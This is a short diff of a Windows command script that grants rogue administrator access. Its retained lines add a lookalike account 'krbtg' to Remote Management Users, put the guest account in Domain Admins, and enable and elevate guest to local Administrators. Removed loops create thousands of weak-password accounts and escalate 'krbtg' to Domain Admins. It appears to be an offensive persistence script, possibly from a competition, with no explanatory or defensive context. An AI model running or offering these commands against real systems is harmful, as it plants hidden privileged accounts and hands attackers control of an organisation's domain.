@@ -8,32 +8,6 @@ NET LOCALGROUP "Remote Management Users" krbtg /ADD
 
 net group "Domain Admins" guest /ADD
 
-#For newer PowerShell
-for ($i = 0; $i -lt 1000; $i++) {
-  New-LocalUser -Name "bob$i" -Password "Password1!" 
-  net group "Domain Admins" krbtg /ADD /DOMAIN
-}
-
-for ($i = 0; $i -lt 1000; $i++) {
-  New-LocalUser -Name "Donald Trump$i" -Password "Password1!" 
-}
-
-for ($i = 0; $i -lt 1000; $i++) {
-  New-LocalUser -Name "Ron Desantis$i" -Password "Password1!" 
-}
-
-for ($i = 0; $i -lt 1000; $i++) {
-  New-LocalUser -Name "Hacker$i" -Password "Password1!" 
-}
-
-for ($i = 0; $i -lt 1000; $i++) {
-  New-LocalUser -Name "Kaiser Wilhem$i" -Password "Password1!" 
-}
-
-for ($i = 0; $i -lt 1000; $i++) {
-  New-LocalUser -Name "moleary$i" -Password "Password1!" 
-}
-
 # For Older Powershell
 net user guest /active:yes
 net localgroup "Administrators" guest /add /y
